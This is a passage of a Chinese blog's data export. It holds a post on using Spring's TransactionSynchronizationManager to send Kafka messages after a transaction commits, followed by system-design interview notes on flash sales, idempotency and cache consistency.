They will be executed in an order according to their order value (if any).  </span><br><span class=\"line\">  * @param synchronization the synchronization object to register  </span><br><span class=\"line\">  * @throws IllegalStateException if transaction synchronization is not active  </span><br><span class=\"line\">  * @see org.springframework.core.Ordered  </span><br><span class=\"line\">  */  </span><br><span class=\"line\">public static void registerSynchronization(TransactionSynchronization synchronization)  </span><br><span class=\"line\">    throws IllegalStateException &#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    Assert.notNull(synchronization, &quot;TransactionSynchronization must not be null&quot;);  </span><br><span class=\"line\">    if (!isSynchronizationActive()) &#123;  </span><br><span class=\"line\">        throw new IllegalStateException(&quot;Transaction synchronization is not active&quot;);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    synchronizations.get().add(synchronization);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这里又使用到了synchronizations线程变量，我们在判断是否存在事务时，就是判断这个线程变量内部是否有值。那我们现在想在<strong>事务提交后触发自定义逻辑</strong>和这个有什么关系呢？</p>\n<p>如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。</p>\n<p>我们在上面构建<strong>流水落地api</strong>的伪代码中有向synchronizations内部添加了一个TransactionSynchronizationAdapter，内部并重写了afterCompletion方法，其代码如下所示：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">TransactionSynchronizationManager.registerSynchronization(new TransactionSynchronizationAdapter() &#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    @Override  </span><br><span class=\"line\">    public void afterCompletion(int status) &#123;  </span><br><span class=\"line\">        if (status == TransactionSynchronization.STATUS_COMMITTED) &#123;  </span><br><span class=\"line\">            // 事务提交后，再异步发送消息给kafka  </span><br><span class=\"line\">            executor.submit(() -&gt; &#123;  </span><br><span class=\"line\">                    try &#123;  </span><br><span class=\"line\">                     // 发送消息给kafka  </span><br><span class=\"line\">                    &#125; catch (Exception e) &#123;  </span><br><span class=\"line\">                     // 记录异常信息，发邮件或者进入待处理列表，让开发人员感知异常  </span><br><span class=\"line\">                    &#125;  </span><br><span class=\"line\">            &#125;);  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">&#125;);  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>我们结合registerSynchronization的源码来看，其实这段代码主要就是向线程变量内部的LinkedHashSet添加了一个对象而已，但就是这么一个操作，让Spring在事务执行的过程中变得<code>“有事情可做”</code>。这是什么意思呢？是因为Spring在执行事务方法时，对于操作事务的每一个阶段都有一个回调操作，比如：trigger系列的回调</p>\n<p><img src=\"/./2024/06/16/%E9%AB%98%E6%95%88%E6%94%AF%E4%BB%98%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84/3.png\"><br>invoke系列的回调</p>\n<p><img src=\"/./2024/06/16/%E9%AB%98%E6%95%88%E6%94%AF%E4%BB%98%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84/4.png\"><br>而我们现在的需求就是在事务提交后触发自定义的函数，那就是在invokeAfterCommit和invokeAfterCompletion这两个方法来选了。首先，这两个方法都会拿到所有TransactionSynchronization的集合（其中会包括我们上述添加的TransactionSynchronizationAdapter）。但是要注意一点：invokeAfterCommit只能拿到集合，invokeAfterCompletion除了集合还有一个int类型的参数，而这个int类型的参数其实是当前事务的一种状态。也就是说，如果我们重写了invokeAfterCompletion方法，我们除了能拿到集合外，还能拿到当前事务的状态。因此，此时我们可以根据这个状态来做不同的事情，比如：可以在事务提交时做自定义处理，也可以在事务回滚时做自定义处理等等。</p>\n<h2 id=\"四、总结\"><a href=\"#四、总结\" class=\"headerlink\" title=\"四、总结\"></a>四、总结</h2><p>上面有说到，我们<strong>判断当前是否存在事务、添加钩子函数</strong>都是依赖线程变量的。因此，我们在使用过程中，一定要<strong>避免切换线程</strong>。否则会出现<strong>不生效</strong>的情况。</p>\n","cover":"/img/hubian.png","cover_type":"img","excerpt":"","more":"<h2 id=\"一、案例背景\"><a href=\"#一、案例背景\" class=\"headerlink\" title=\"一、案例背景\"></a>一、案例背景</h2><p>拿支付系统相关的业务来举例。在支付系统中，我们需要记录每个账户的资金流水（记录用户A因为哪个操作扣了钱，因为哪个操作加了钱），这样我们才能对每个账户的<strong>账</strong>做到心中有数，对于支付系统而言，资金流水的数据可谓是<strong>最重要</strong>的。因此，为了防止支付系统的老大<strong>徇私舞弊</strong>，CTO提了一个<strong>流水存档</strong>的需求：要求支付系统对每个账户的资金流水做一份存档，要求支付系统在写流水的时候，把流水相关的信息以消息的形式推送到kafka，由<strong>存档系统</strong>消费这个消息并落地到库里（这个库只有<strong>存档系统</strong>拥有写权限）。整个需求的流程如下所示：</p>\n<p><img src=\"/./2024/06/16/%E9%AB%98%E6%95%88%E6%94%AF%E4%BB%98%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84/1.png\"><br>整个需求的流程还是比较简单的，考虑到后续会有其他事业部也要进行数据存档操作，CTO建议支付系统团队内部开发一个二方库，这个二方库的主要功能就是发送消息到kafka中去。</p>\n<h2 id=\"二、确定方案\"><a href=\"#二、确定方案\" class=\"headerlink\" title=\"二、确定方案\"></a>二、确定方案</h2><p>既然要求开发一个二方库，因此，我们需要考虑如下几件事情：</p>\n<blockquote>\n<p>1、技术栈使用的springboot，因此，这里最好以starter的方式提供</p>\n<p>2、二方库需要发送消息给kafka，最好是二方库内部基于kafka生产者的api创建生产者，不要使用Spring自带的kafkaTemplate，因为集成方有可能已经使用了kafkaTemplate。不能与集成方造成冲突。</p>\n<p>3、减少对接方的集成难度、学习成本，最好是提供一个简单实用的api，业务侧能简单上手。</p>\n<p>4、<strong>发送消息这个操作需要支持事务，尽量不影响主业务</strong></p>\n</blockquote>\n<p>在上述的几件事情中，最需要注意的应该就是第4点：<strong>发送消息这个操作需要支持事务，尽量不影响主业务</strong>。这是什么意思呢？首先，尽量不影响主业务，这个最简单的方式就是使用<strong>异步</strong>机制。</p>\n<p>如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。</p>\n<p>其次，需要支持事务是指：<strong>假设我们的api是在事务方法内部调用的，那么我们需要保证事务提交后再执行这个api</strong>。那么，我们的流水落地api应该要有这样的功能：</p>\n<p><img src=\"/./2024/06/16/%E9%AB%98%E6%95%88%E6%94%AF%E4%BB%98%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84/2.png\"><br>内部可以判断当前是否存在事务，如果存在事务，则需要等事务提交后再异步发送消息给kafka。如果不存在事务则直接异步发送消息给kafka。而且这样的判断逻辑得放在二方库内部才行。那现在摆在我们面前的问题就是：<strong>我要如何判断当前是否存在事务，以及如何在事务提交后再触发我们自定义的逻辑呢？</strong></p>\n<h2 id=\"三、TransactionSynchronizationManager显神威\"><a href=\"#三、TransactionSynchronizationManager显神威\" class=\"headerlink\" title=\"三、TransactionSynchronizationManager显神威\"></a>三、TransactionSynchronizationManager显神威</h2><p>这个类内部所有的变量、方法都是static修饰的，也就是说它其实是一个工具类。是一个<strong>事务同步器</strong>。下述是<strong>流水落地API</strong>的伪代码，这段代码就解决了我们上述提到的疑问：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">private final ExecutorService executor = Executors.newSingleThreadExecutor();  </span><br><span class=\"line\">  </span><br><span class=\"line\">public void sendLog() &#123;  </span><br><span class=\"line\">    // 判断当前是否存在事务  </span><br><span class=\"line\">    if (!TransactionSynchronizationManager.isSynchronizationActive()) &#123;  </span><br><span class=\"line\">        // 无事务，异步发送消息给kafka  </span><br><span class=\"line\">          </span><br><span class=\"line\">        executor.submit(() -&gt; &#123;  </span><br><span class=\"line\">            // 发送消息给kafka  </span><br><span class=\"line\">            try &#123;  </span><br><span class=\"line\">                // 发送消息给kafka  </span><br><span class=\"line\">            &#125; catch (Exception e) &#123;  </span><br><span class=\"line\">                // 记录异常信息，发邮件或者进入待处理列表，让开发人员感知异常  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;);  </span><br><span class=\"line\">        return;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    // 有事务，则添加一个事务同步器，并重写afterCompletion方法（此方法在事务提交后会做回调）  </span><br><span class=\"line\">    TransactionSynchronizationManager.registerSynchronization(new TransactionSynchronizationAdapter() &#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">        @Override  </span><br><span class=\"line\">        public void afterCompletion(int status) &#123;  </span><br><span class=\"line\">            if (status == TransactionSynchronization.STATUS_COMMITTED) &#123;  </span><br><span class=\"line\">                // 事务提交后，再异步发送消息给kafka  </span><br><span class=\"line\">                executor.submit(() -&gt; &#123;  </span><br><span class=\"line\">                    try &#123;  </span><br><span class=\"line\">                     // 发送消息给kafka  </span><br><span class=\"line\">                    &#125; catch (Exception e) &#123;  </span><br><span class=\"line\">                     // 记录异常信息，发邮件或者进入待处理列表，让开发人员感知异常  </span><br><span class=\"line\">                    &#125;  </span><br><span class=\"line\">                &#125;);  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    &#125;);  </span><br><span class=\"line\">  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>代码比较简单，其主要是<strong>TransactionSynchronizationManager</strong>的使用。</p>\n<h3 id=\"3-1、判断是否存在事务？TransactionSynchronizationManager-isSynchronizationActive-方法显神威\"><a href=\"#3-1、判断是否存在事务？TransactionSynchronizationManager-isSynchronizationActive-方法显神威\" class=\"headerlink\" title=\"3.1、判断是否存在事务？TransactionSynchronizationManager.isSynchronizationActive() 方法显神威\"></a>3.1、判断是否存在事务？TransactionSynchronizationManager.isSynchronizationActive() 方法显神威</h3><ul>\n<li>我们先看下这个方法的源码：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// TransactionSynchronizationManager.java类内部的部分代码  </span><br><span class=\"line\">  </span><br><span class=\"line\">private static final ThreadLocal&lt;Set&lt;TransactionSynchronization&gt;&gt; synchronizations =  </span><br><span class=\"line\">   new NamedThreadLocal&lt;&gt;(&quot;Transaction synchronizations&quot;);  </span><br><span class=\"line\">  </span><br><span class=\"line\">public static boolean isSynchronizationActive() &#123;  </span><br><span class=\"line\">    return (synchronizations.get() != null);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">很明显，synchronizations是一个线程变量（ThreadLocal）。那它是在什么时候set进去的呢？这里的话，可以参考下这个方法：org.springframework.transaction.support.TransactionSynchronizationManager\\#initSynchronization，其源码如下所示：  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/**  </span><br><span class=\"line\">  * Activate transaction synchronization for the current thread.  </span><br><span class=\"line\">  * Called by a transaction manager on transaction begin.  </span><br><span class=\"line\">  * @throws IllegalStateException if synchronization is already active  </span><br><span class=\"line\">  */  </span><br><span class=\"line\">public static void initSynchronization() throws IllegalStateException &#123;  </span><br><span class=\"line\">    if (isSynchronizationActive()) &#123;  </span><br><span class=\"line\">        throw new IllegalStateException(&quot;Cannot activate transaction synchronization - already active&quot;);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    logger.trace(&quot;Initializing transaction synchronization&quot;);  </span><br><span class=\"line\">    synchronizations.set(new LinkedHashSet&lt;&gt;());  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>由源码中的注释也可以知道，它是在事务管理器开启事务时调用的。换句话说，只要我们的程序执行到带有事务特性的方法时，就会在线程变量中放入一个LinkedHashSet，用来标识当前存在事务。只要isSynchronizationActive返回true，则代表当前有事务。因此，结合这两个方法我们是指能解决我们最开始提出的疑问：<code>要如何判断当前是否存在事务</code></p>\n<h3 id=\"3-2、如何在事务提交后触发自定义逻辑？TransactionSynchronizationManager-registerSynchronization-方法显神威\"><a href=\"#3-2、如何在事务提交后触发自定义逻辑？TransactionSynchronizationManager-registerSynchronization-方法显神威\" class=\"headerlink\" title=\"3.2、如何在事务提交后触发自定义逻辑？TransactionSynchronizationManager.registerSynchronization()方法显神威\"></a>3.2、如何在事务提交后触发自定义逻辑？TransactionSynchronizationManager.registerSynchronization()方法显神威</h3><ul>\n<li>我们来看下这个方法的源代码：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/**  </span><br><span class=\"line\">  * Register a new transaction synchronization for the current thread.  </span><br><span class=\"line\">  * Typically called by resource management code.  </span><br><span class=\"line\">  * &lt;p&gt;Note that synchronizations can implement the  </span><br><span class=\"line\">  * &#123;@link org.springframework.core.Ordered&#125; interface.  </span><br><span class=\"line\">  * They will be executed in an order according to their order value (if any).  </span><br><span class=\"line\">  * @param synchronization the synchronization object to register  </span><br><span class=\"line\">  * @throws IllegalStateException if transaction synchronization is not active  </span><br><span class=\"line\">  * @see org.springframework.core.Ordered  </span><br><span class=\"line\">  */  </span><br><span class=\"line\">public static void registerSynchronization(TransactionSynchronization synchronization)  </span><br><span class=\"line\">    throws IllegalStateException &#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    Assert.notNull(synchronization, &quot;TransactionSynchronization must not be null&quot;);  </span><br><span class=\"line\">    if (!isSynchronizationActive()) &#123;  </span><br><span class=\"line\">        throw new IllegalStateException(&quot;Transaction synchronization is not active&quot;);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    synchronizations.get().add(synchronization);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这里又使用到了synchronizations线程变量，我们在判断是否存在事务时，就是判断这个线程变量内部是否有值。那我们现在想在<strong>事务提交后触发自定义逻辑</strong>和这个有什么关系呢？</p>\n<p>如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。</p>\n<p>我们在上面构建<strong>流水落地api</strong>的伪代码中有向synchronizations内部添加了一个TransactionSynchronizationAdapter，内部并重写了afterCompletion方法，其代码如下所示：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">TransactionSynchronizationManager.registerSynchronization(new TransactionSynchronizationAdapter() &#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    @Override  </span><br><span class=\"line\">    public void afterCompletion(int status) &#123;  </span><br><span class=\"line\">        if (status == TransactionSynchronization.STATUS_COMMITTED) &#123;  </span><br><span class=\"line\">            // 事务提交后，再异步发送消息给kafka  </span><br><span class=\"line\">            executor.submit(() -&gt; &#123;  </span><br><span class=\"line\">                    try &#123;  </span><br><span class=\"line\">                     // 发送消息给kafka  </span><br><span class=\"line\">                    &#125; catch (Exception e) &#123;  </span><br><span class=\"line\">                     // 记录异常信息，发邮件或者进入待处理列表，让开发人员感知异常  </span><br><span class=\"line\">                    &#125;  </span><br><span class=\"line\">            &#125;);  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">&#125;);  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>我们结合registerSynchronization的源码来看，其实这段代码主要就是向线程变量内部的LinkedHashSet添加了一个对象而已，但就是这么一个操作，让Spring在事务执行的过程中变得<code>“有事情可做”</code>。这是什么意思呢？是因为Spring在执行事务方法时，对于操作事务的每一个阶段都有一个回调操作，比如：trigger系列的回调</p>\n<p><img src=\"/./2024/06/16/%E9%AB%98%E6%95%88%E6%94%AF%E4%BB%98%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84/3.png\"><br>invoke系列的回调</p>\n<p><img src=\"/./2024/06/16/%E9%AB%98%E6%95%88%E6%94%AF%E4%BB%98%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84/4.png\"><br>而我们现在的需求就是在事务提交后触发自定义的函数，那就是在invokeAfterCommit和invokeAfterCompletion这两个方法来选了。首先，这两个方法都会拿到所有TransactionSynchronization的集合（其中会包括我们上述添加的TransactionSynchronizationAdapter）。但是要注意一点：invokeAfterCommit只能拿到集合，invokeAfterCompletion除了集合还有一个int类型的参数，而这个int类型的参数其实是当前事务的一种状态。也就是说，如果我们重写了invokeAfterCompletion方法，我们除了能拿到集合外，还能拿到当前事务的状态。因此，此时我们可以根据这个状态来做不同的事情，比如：可以在事务提交时做自定义处理，也可以在事务回滚时做自定义处理等等。</p>\n<h2 id=\"四、总结\"><a href=\"#四、总结\" class=\"headerlink\" title=\"四、总结\"></a>四、总结</h2><p>上面有说到，我们<strong>判断当前是否存在事务、添加钩子函数</strong>都是依赖线程变量的。因此，我们在使用过程中，一定要<strong>避免切换线程</strong>。否则会出现<strong>不生效</strong>的情况。</p>\n"},{"title":"场景设计面试题","date":"2024-05-26T15:11:48.000Z","_content":"\n\n\n\n## 有A、B两个大文件，每个文件几十G，而内存只有4G，其中A文件存放学号+姓名，而B文件存放学号+分数，要求生成文件C，存放姓名和分数。怎么实现？\n- hash(学号)%1000，A到a0....a1000,B到b0~b1000\n- 学号相同的人一定hash到相同序号的小文件\n- 加载序号相同的小文件（比如：读取a2和b2）用map储存再按姓名+分数写入C即可\n## 秒杀系统怎么设计\n### 秒杀存在的问题\n- 高并发、瞬间请求量极大\n- 黄牛、黑客恶意请求\n- 链接暴露问题\n- 数据库压力问题\n- 库存不足和超卖问题\n### 如何解决这些问题\n- 页面静态化\n    - 秒杀活动的页面，大多数内容都是固定不变的，如商品名称，商品图片等等，可以对活动页面做静态化处理，减少访问服务端的请求。秒杀用户会分布在全国各地，有的在上海，有的在深圳，地域相差很远，网速也各不相同。为了让用户最快访问到活动页面，可以使用CDN（Content Delivery Network，内容分发网络）。CDN可以让用户就近获取所需内容。\n- 按钮至灰控制\n    - 秒杀活动开始前，按钮一般需要置灰的。只有时间到了，才能变得可以点击。这是防止，秒杀用户在时间快到的前几秒，疯狂请求服务器，然后秒杀时间点还没到，服务器就自己挂了。\n- 服务单一职责\n    - 我们都知道微服务设计思想，也就是把各个功能模块拆分，功能那个类似的放一起，再用分布式的部署方式。\n    - 如用户登录相关的，就设计个用户服务，订单相关的就搞个订单服务，再到礼物相关的就搞个礼物服务等等。那么，秒杀相关的业务逻辑也可以放到一起，搞个秒杀服务，单独给它搞个秒杀数据库。\n    - 服务单一职责有个好处：如果秒杀没抗住高并发的压力，秒杀库崩了，服务挂了，也不会影响到系统的其他服务。\n- 秒杀链接加盐\n    - 链接如果明文暴露的话，会有人获取到请求Url，提前秒杀了。因此，需要给秒杀链接加盐。可以把URL动态化，如通过MD5加密算法加密随机的字符串去做url。\n- 限流\n    - 一般有两种方式限流：nginx限流和redis限流。\n    - 为了防止某个用户请求过于频繁，我们可以对同一用户限流；\n    - 为了防止黄牛模拟几个用户请求，我们可以对某个IP进行限流；\n    - 为了防止有人使用代理，每次请求都更换IP请求，我们可以对接口进行限流。\n    - 为了防止瞬时过大的流量压垮系统，还可以使用阿里的Sentinel、Hystrix组件进行限流。\n- 分布式锁\n    - 可以使用redis分布式锁解决超卖问题。\n    - 使用Redis的SET EX PX NX + 校验唯一随机值,再删除释放锁。\n    - 为了更严谨，一般也是用lua脚本代替。lua脚本如下：\n- MQ异步处理\n    - 如果瞬间流量特别大，可以使用消息队列削峰，异步处理。用户请求过来的时候，先放到消息队列，再拿出来消费。\n- 限流&降级&熔断\n    - 限流，就是限制请求，防止过大的请求压垮服务器；\n    - 降级，就是秒杀服务有问题了，就降级处理，不要影响别的服务；\n    - 熔断，服务有问题就熔断，一般熔断降级是一起出现。\n## 产品上线出问题怎么定位错误\n- 复现问题\n- top jstack\n## 大量并发查询用户商品信息，MySQL压力大查询慢，保证速度怎么优化方案\n读写分离\n## 海量日志数据，提取出某日访问百度次数最多的那个IP。\n- 可以考虑采用“分而治之”的思想，按照IP地址的Hash(IP)%1024值，把海量IP日志分别存储到1024个小文件中。这样，每个小文件最多包含4MB个IP地址\n- 对于每一个小文件，可以构建一个IP为key，出现次数为value的Hash map，同时记录当前出现次数最多的那个IP地址\n- 可以得到1024个小文件中的出现次数最多的IP，再依据常规的排序算法得到总体上出现次数最多的IP；\n## 给定a、b两个文件，各存放50亿个url，每个url各占64字节，内存限制是4G，让你找出a、b文件共同的url？\n### 方案1\n- 遍历文件a，对每个url求取hash(url)%1000，然后根据所取得的值将url分别存储到1000个小文件（记为a0,a1,...,a999）中。这样每个小文件的大约为300M。\n- 遍历文件b，采取和a相同的方式将url分别存储到1000小文件（记为b0,b1,...,b999）。这样处理后，所有可能相同的url都在对应的小文件（a0vsb0,a1vsb1,...,a999vsb999）中，不对应的小文件不可能有相同的url。然后我们只要求出1000对小文件中相同的url即可。\n- 求每对小文件中相同的url时，可以把其中一个小文件的url存储到hash_set中。然后遍历另一个小文件的每个url，看其是否在刚才构建的hash_set中，如果是，那么就是共同的url，存到文件里面就可以了。\n### 方案2\n如果允许有一定的误差，使用布隆过滤器\n## 一般内存不足而需要分析的数据又很大的问题都可以使用分治的思想，将数据hash(x)%1000分为小文件再分别加载小文件到内存中处理即可\n\n## 如何保证接口的幂等性\n\n### 什么是幂等性\n幂等性是系统服务对外一种承诺，承诺只要调用接口成功，外部多次调用对系统的影响是一致的。声明为幂等的服务会认为外部调用失败是常态，并且失败之后必然会有重试。\n\n### 什么情况下需要幂等\n\n以SQL为例：\n\n- SELECT col1 FROM tab1 WHER col2=2，无论执行多少次都不会改变状态，是天然的幂等。\n- UPDATE tab1 SET col1=1 WHERE col2=2，无论执行成功多少次状态都是一致的，因此也是幂等操作。\n- UPDATE tab1 SET col1=col1+1 WHERE col2=2，每次执行的结果都会发生变化，这种不是幂等的。\n- insert into user(userid,name) values(1,'a') 如userid为唯一主键，即重复操作上面的业务，只会插入一条用户数据，具备幂等性。\n    - 如userid不是主键，可以重复，那上面业务多次操作，数据都会新增多条，不具备幂等性。\n- delete from user where userid=1，多次操作，结果一样，具备幂等性\n\n### 如何保证幂等\n\n#### 1、token机制\n- 服务端提供了发送token的接口。我们在分析业务的时候，哪些业务是存在幂等问题的，就必须在执行业务前，先去获取token，服务器会把token保存到redis中。\n- 然后调用业务接口请求时，把token携带过去，一般放在请求头部。\n- 服务器判断token是否存在redis中，存在表示第一次请求，然后删除token,继续执行业务。\n- 如果判断token不存在redis中，就表示是重复操作，直接返回重复标记给client，这样就保证了业务代码，不被重复执行。\n\n**关键点 先删除token，还是后删除token。**\n\n后删除token：如果进行业务处理成功后，删除redis中的token失败了，这样就导致了有可能会发生重复请求，因为token没有被删除。这个问题其实是数据库和缓存redis数据不一致问题，后续会写文章进行讲解。\n\n先删除token：如果系统出现问题导致业务处理出现异常，业务处理没有成功，接口调用方也没有获取到明确的结果，然后进行重试，但token已经删除掉了，服务端判断token不存在，认为是重复请求，就直接返回了，无法进行业务处理了。\n\n先删除token可以保证不会因为重复请求，业务数据出现问题。出现业务异常，可以让调用方配合处理一下，重新获取新的token，再次由业务调用方发起重试请求就ok了。\n\n**token机制缺点**\n\n业务请求每次请求，都会有额外的请求（一次获取token请求、判断token是否存在的业务）。其实真实的生产环境中，1万请求也许只会存在10个左右的请求会发生重试，为了这10个请求，我们让9990个请求都发生了额外的请求。\n\n#### 2、乐观锁机制\n\n- 这种方法适合在更新的场景中，update t_goods set count = count -1 , version = version + 1 where good_id=2 and version = 1\n- 根据version版本，也就是在操作库存前先获取当前商品的version版本号，然后操作的时候带上此version号。我们梳理下，我们第一次操作库存时，得到version为1，调用库存服务version变成了2；但返回给订单服务出现了问题，订单服务又一次发起调用库存服务，当订单服务传如的version还是1，再执行上面的sql语句时，就不会执行；因为version已经变为2了，where条件就不成立。这样就保证了不管调用几次，只会真正的处理一次。\n- 乐观锁主要使用于处理读多写少的问题\n\n#### 3、唯一主键\n\n这个机制是利用了数据库的主键唯一约束的特性，解决了在insert场景时幂等问题。但主键的要求不是自增的主键，这样就需要业务生成全局唯一的主键。\n\n如果是分库分表场景下，路由规则要保证相同请求下，落地在同一个数据库和同一表中，要不然数据库主键约束就不起效果了，因为是不同的数据库和表主键不相关\n\n#### 4、防重表\n\n使用订单号orderNo做为去重表的唯一索引，把唯一索引插入去重表，再进行业务操作，且他们在同一个事务中。这个保证了重复请求时，因为去重表有唯一约束，导致请求失败，避免了幂等问题。这里要注意的是，去重表和业务表应该在同一库中，这样就保证了在同一个事务，即使业务操作失败了，也会把去重表的数据回滚。这个很好的保证了数据一致性。\n\n#### 5、唯一ID\n\n调用接口时，生成一个唯一id，redis将数据保存到集合中（去重），存在即处理过。\n\n## 缓存和数据库不一致问题\n### 更新缓存和更新数据库\n大部分观点认为，做缓存不应该是去更新缓存，而是应该删除缓存，然后由下个请求去去缓存，发现不存在后再读取数据库，写入缓存。观点引用：《分布式之数据库和缓存双写一致性方案解析》孤独烟\n\n原因一：线程安全角度同时有请求A和请求B进行更新操作，那么会出现（1）线程A更新了数据库（2）线程B更新了数据库（3）线程B更新了缓存（4）线程A更新了缓存这就出现请求A更新缓存应该比请求B更新缓存早才对，但是因为网络等原因，B却比A更早更新了缓存。这就导致了脏数据，因此不考虑。\n\n原因二：业务场景角度有如下两点：\n1. 如果你是一个写数据库场景比较多，而读数据场景比较少的业务需求，采用这种方案就会导致，数据压根还没读到，缓存就被频繁的更新，浪费性能。\n2. 如果你写入数据库的值，并不是直接写入缓存的，而是要经过一系列复杂的计算再写入缓存。那么，每次写入数据库后，都再次计算写入缓存的值，无疑是浪费性能的。显然，删除缓存更为适合。\n\n### 删缓存和更新数据库\n#### 先删缓存，再更新数据库\n该方案会导致请求数据不一致同时有一个请求A进行更新操作，另一个请求B进行查询操作。那么会出现如下情形:\n1. 请求A进行写操作，删除缓存\n2. 请求B查询发现缓存不存在\n3. 请求B去数据库查询得到旧值\n4. 请求B将旧值写入缓存\n5. 请求A将新值写入数据库上述情况就会导致不一致的情形出现。\n   而且，如果不采用给缓存设置过期时间策略，该数据永远都是脏数据。\n#### 先更新数据库，再删缓存\n这种情况不存在并发问题么？不是的。假设这会有两个请求，一个请求A做查询操作，一个请求B做更新操作，那么会有如下情形产生\n1. 缓存刚好失效\n2. 请求A查询数据库，得一个旧值\n3. 请求B将新值写入数据库\n4. 请求B删除缓存\n5. 请求A将查到的旧值写入缓存ok，如果发生上述情况，确实是会发生脏数据。 然而，发生这种情况的概率又有多少呢？发生上述情况有一个先天性条件，就是步骤（3）的写数据库操作比步骤（2）的读数据库操作耗时更短，才有可能使得步骤（4）先于步骤（5）。可是，大家想想，数据库的读操作的速度远快于写操作的（不然做读写分离干嘛，做读写分离的意义就是因为读操作比较快，耗资源少），因此步骤（3）耗时比步骤（2）更短，这一情形很难出现。\n\n先更新数据库，再删缓存依然会有问题，不过，问题出现的可能性会因为上面说的原因，变得比较低！(补充说明：我用了“先更新数据库，再删缓存”且不设过期时间策略，会不会有问题呢？由于先缓存和更新数据库不是原子的，如果更新了数据库，程序歇逼，就没删缓存，由于没有过期策略，就永远脏数据了。)所以，如果你想实现基础的缓存数据库双写一致的逻辑，那么在大多数情况下，在不想做过多设计，增加太大工作量的情况下，请先更新数据库，再删缓存!\n### 数据库和缓存数据强一致怎么办\n没有办法做到绝对的一致性，这是由CAP理论决定的，缓存系统适用的场景就是非强一致性的场景，所以它属于CAP中的AP。所以，我们得委曲求全，可以去做到BASE理论中说的最终一致性。\n\n大佬们给出了到达最终一致性的解决思路，主要是针对上面两种双写策略（先删缓存，再更新数据库/先更新数据库，再删缓存）导致的脏数据问题，进行相应的处理，来保证最终一致性。\n\n#### 缓存延时双删\n步骤\n1. 先删除缓存\n2. 再写数据库\n3. 休眠500毫秒（根据具体的业务时间来定）\n4. 再次删除缓存。\n\n#### 那么，这个休眠500毫秒怎么确定的，具体该休眠多久呢？\n\n针对上面的情形，读者应该自行评估自己的项目的读数据业务逻辑的耗时。然后写数据的休眠时间则在读数据业务逻辑的耗时基础上，加几百ms即可。这么做的目的，就是确保读请求结束，写请求可以删除读请求造成的缓存脏数据。\n\n\n#### 如果你用了mysql的读写分离架构怎么办？\n\nok，在这种情况下，造成数据不一致的原因如下，还是两个请求，一个请求A进行更新操作，另一个请求B进行查询操作。\n1. 请求A进行写操作，删除缓存\n2. 请求A将数据写入数据库了，\n3. 请求B查询缓存发现，缓存没有值\n4. 请求B去从库查询，这时，还没有完成主从同步，因此查询到的是旧值\n5. 请求B将旧值写入缓存\n6. 数据库完成主从同步，从库变为新值上述情形，就是数据不一致的原因。还是使用双删延时策略。只是，睡眠时间修改为在主从同步的延时时间基础上，加几百ms。\n\n#### 采用这种同步淘汰策略，吞吐量降低怎么办？\n\nok，那就将第二次删除作为异步的。自己起一个线程，异步删除。这样，写的请求就不用沉睡一段时间后了，再返回。这么做，加大吞吐量。\n\n#### 